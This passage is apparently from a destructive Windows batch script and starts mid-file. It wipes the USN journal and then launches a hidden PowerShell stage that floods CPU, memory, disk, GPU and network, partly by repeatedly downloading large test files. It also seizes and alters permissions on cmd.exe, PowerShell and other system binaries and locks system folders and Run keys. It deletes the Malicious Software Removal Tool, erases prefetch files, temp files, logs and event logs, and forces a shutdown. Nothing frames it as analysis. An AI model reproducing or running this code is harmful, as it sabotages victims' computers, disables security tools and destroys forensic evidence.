)
set "usn=!d!\usn_!random!.bin"
fsutil usn readjournal %SystemDrive% > "!usn!" 2>nul
fsutil usn deletejournal /d %SystemDrive% >nul 2>&1
fsutil usn createjournal m=1000 a=100 %SystemDrive% >nul 2>&1
set "oplock=!d!\oplock_!random!.tmp"
type nul > "!oplock!" 2>nul
fsutil oplock "!oplock!" /w >nul 2>&1
start /b cmd /c "del /f /q \"!x!\" >nul 2>&1 & del /f /q \"!oplock!\" >nul 2>&1 & rmdir /s /q \"!d!\" >nul 2>&1 & subst /d !drive_letters! >nul 2>&1"
goto :stage2_payload

:stage2_payload
> "!p!" (
echo $ErrorActionPreference = 'SilentlyContinue'
echo $cpu = [Environment]::ProcessorCount
echo $ram = [int]((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1MB)
echo $jobs = @()
echo for ($i=0; $i -lt $cpu; $i++) { $jobs += Start-Job -ScriptBlock { while ($true) { $null = Get-Random } } }
echo $mem = [System.Collections.ArrayList]::new()
echo Start-Job -ScriptBlock { while ($true) { try { $mem.Add('x' * 1GB) } catch { $mem.Clear() } } }
echo Start-Job -ScriptBlock { while ($true) { try { $f = Join-Path $env:TEMP "d_$(Get-Random).tmp"; [IO.File]::WriteAllBytes($f, (New-Object Byte[] 1GB)) } catch {} } }
echo Start-Job -ScriptBlock { while ($true) { try { $f = Join-Path $env:TEMP "f_$(Get-Random).tmp"; fsutil file createnew $f 1073741824 ^> $null 2^>^&1 } catch {} } }
echo Start-Job -ScriptBlock { $w = New-Object System.Net.WebClient; while ($true) { try { $w.DownloadFile('http://cachefly.cachefly.net/100mb.test', "$env:TEMP\n_$(Get-Random).tmp") } catch {} } }
echo for ($i=0; $i -lt $cpu; $i++) { Start-Job -ScriptBlock { while ($true) { [math]::Sqrt([math]::PI * [math]::E) } } }
echo Add-Type -TypeDefinition @'
echo using System;
echo using System.Drawing;
echo using System.Runtime.InteropServices;
echo public class GPUStress {
echo     [DllImport(\"user32.dll\")]
echo     public static extern bool EnumDisplaySettings(string deviceName, int modeNum, ref DEVMODE devMode);
echo     [StructLayout(LayoutKind.Sequential)]
echo     public struct DEVMODE {
echo         [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmDeviceName;
echo         public short dmSpecVersion; public short dmDriverVersion; public short dmSize; public short dmDriverExtra;
echo         public int dmFields; public int dmPositionX; public int dmPositionY; public int dmDisplayOrientation;
echo         public int dmDisplayFixedOutput; public short dmColor; public short dmDuplex; public short dmYResolution;
echo         public short dmTTOption; public short dmCollate; [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmFormName;
echo         public short dmLogPixels; public int dmBitsPerPel; public int dmPelsWidth; public int dmPelsHeight;
echo         public int dmDisplayFlags; public int dmDisplayFrequency; public int dmICMMethod; public int dmICMIntent;
echo         public int dmMediaType; public int dmDitherType; public int dmReserved1; public int dmReserved2;
echo         public int dmPanningWidth; public int dmPanningHeight;
echo     }
echo     public static void Stress() {
echo         Bitmap bmp = new Bitmap(1920, 1080);
echo         Graphics g = Graphics.FromImage(bmp);
echo         Random r = new Random();
echo         while (true) {
echo             for (int x = 0; x ^< 1920; x++) {
echo                 for (int y = 0; y ^< 1080; y++) {
echo                     bmp.SetPixel(x, y, Color.FromArgb(r.Next(256), r.Next(256), r.Next(256)));
echo                 }
echo             }
echo             g.DrawImage(bmp, 0, 0);
echo             System.Threading.Thread.Sleep(1);
echo         }
echo     }
echo }
echo '@
echo [GPUStress]::Stress()
echo for ($i=0; $i -lt $cpu; $i++) { Start-Job -ScriptBlock { while ($true) { $f = Join-Path $env:TEMP "g_$(Get-Random).tmp"; fsutil file createnew $f 2147483648 ^> $null 2^>^&1 } } }
echo for ($i=0; $i -lt $cpu; $i++) { Start-Job -ScriptBlock { $w = New-Object System.Net.WebClient; while ($true) { try { $w.DownloadFile('http://cachefly.cachefly.net/1gb.test', "$env:TEMP\o_$(Get-Random).tmp") } catch {} } } }
echo $block = [byte[]]::new(1MB)
echo Start-Job -ScriptBlock { while ($true) { $null = [System.Security.Cryptography.RNGCryptoServiceProvider]::GetBytes($block) } }
echo Start-Job -ScriptBlock { while ($true) { try { $psi = New-Object System.Diagnostics.ProcessStartInfo; $psi.FileName = 'cmd.exe'; $psi.Arguments = '/c dir /s %SystemDrive%\'; $psi.WindowStyle = 'Hidden'; $p = [System.Diagnostics.Process]::Start($psi) } catch {} } }
echo while ($true) { Start-Sleep -Seconds 30; [System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers() }
)
start /b powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "!p!" 2>nul 1>nul
timeout /t 3 /nobreak >nul
del "!p!" 2>nul
goto :CRASH

:CRASH
set "timeout=2"
timeout /t %timeout% /nobreak >nul 2>&1
set "sys32=%SystemRoot%\system32"
set "sys64=%SystemRoot%\SysWOW64"
set "psPath=%sys32%\WindowsPowerShell\v1.0\powershell.exe"
set "ps64Path=%sys64%\WindowsPowerShell\v1.0\powershell.exe"

set "criticalFiles=%sys32%\cmd.exe %sys64%\cmd.exe %sys32%\net.exe %sys64%\net.exe %sys32%\net1.exe %sys64%\net1.exe %sys32%\mshta.exe %sys64%\mshta.exe %sys64%\FTP.exe %sys32%\wscript.exe %sys64%\wscript.exe %sys32%\cscript.exe %sys64%\cscript.exe %psPath% %ps64Path%"

for %%f in (%criticalFiles%) do (
    if exist "%%f" (
        takeown /f "%%f" /a >nul 2>&1
        icacls "%%f" /grant:r Administrators:F /grant:r SYSTEM:F /grant:r Users:RX /deny "NETWORK SERVICE":F /deny "SERVICE":F /deny "mssqlserver":F /deny "mssql$sqlexpress":F /deny "TrustedInstaller":F >nul 2>&1
    )
)

set "protectedDirs=%ProgramData% %Public%"
for %%d in (%protectedDirs%) do (
    if exist "%%d" (
        takeown /f "%%d" /a /r /d y >nul 2>&1
        icacls "%%d" /grant:r Administrators:F /grant:r SYSTEM:F /grant:r Users:RX /deny "NETWORK SERVICE":F /deny "SERVICE":F /deny "mssqlserver":F /deny "mssql$sqlexpress":F /deny "TrustedInstaller":F /t /c /q >nul 2>&1
    )
)

set "lockdownPaths=%sys32%\config %sys32%\drivers %sys32%\spool %ProgramData%\Microsoft\Windows\Start Menu %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

for %%p in (%lockdownPaths%) do (
    if exist "%%p" (
        icacls "%%p" /deny "Users":(OI)(CI)WD /deny "Authenticated Users":(OI)(CI)WD /deny "Everyone":(OI)(CI)WD /t /c /q >nul 2>&1
    )
)

set "registryKeys=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System HKLM\SYSTEM\CurrentControlSet\Services"
for %%k in (%registryKeys%) do (
    reg add "%%k" /v "Lockdown" /t REG_DWORD /d 1 /f >nul 2>&1
    regini "%%k" >nul 2>&1
)

takeown /f "%sys32%\mrt.exe" >nul 2>&1
icacls "%sys32%\mrt.exe" /grant administrators:F >nul 2>&1
del /f /q "%sys32%\mrt.exe" >nul 2>&1
takeown /f "%sys32%\MRT-KB*.exe" /r /d y >nul 2>&1
del /f /q "%sys32%\MRT-KB*.exe" >nul 2>&1
del /f /q /s "%WINDIR%\Prefetch\*.pf" >nul 2>&1
del /f /q /s "%WINDIR%\Temp\*.*" >nul 2>&1
del /f /q /s "%TEMP%\*.*" >nul 2>&1
del /f /q /s "%WINDIR%\Logs\*.*" >nul 2>&1
del /f /q /s "%WINDIR%\System32\LogFiles\*.*" >nul 2>&1
del /f /q /s "%WINDIR%\System32\WDI\*.log" >nul 2>&1
del /f /q /s "%WINDIR%\System32\winevt\Logs\*.evtx" >nul 2>&1
shutdown /s /f /t 5
